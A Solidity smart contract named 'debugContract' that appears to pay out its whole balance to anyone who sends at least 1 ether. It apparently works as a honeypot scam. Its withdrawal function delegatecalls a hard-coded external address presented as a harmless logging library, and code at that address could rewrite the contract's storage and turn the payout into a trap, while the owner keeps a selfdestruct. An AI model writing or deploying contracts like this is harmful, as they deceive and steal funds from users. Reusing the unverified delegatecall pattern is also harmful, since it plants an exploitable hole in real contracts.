1 pragma solidity 0.4.19;
2 contract loglibs {
3    mapping (address => uint256) public sendList;
4    
5    function logSendEvent() payable public{
6         sendList[msg.sender] = 1 ether;
7    }
8 
9 }
10 
11 contract debugContract
12 {
13     address Owner=msg.sender;
14     uint256 public Limit= 1 ether;
15     address loglib = 0xBC3A2d9D5Cf09013FB6ED85d97B180EaF76000Bd; //log
16 
17     function()payable public{}
18     
19     function withdrawal()
20     payable public
21     {
22 
23         if(msg.value>=Limit)
24         {
25             loglib.delegatecall(bytes4(sha3("logSendEvent()"))); //Log the address
26             msg.sender.send(this.balance);
27         }
28     }
29 
30     function kill() public {
31         require(msg.sender == Owner);
32         selfdestruct(msg.sender);
33     }
34 
35 }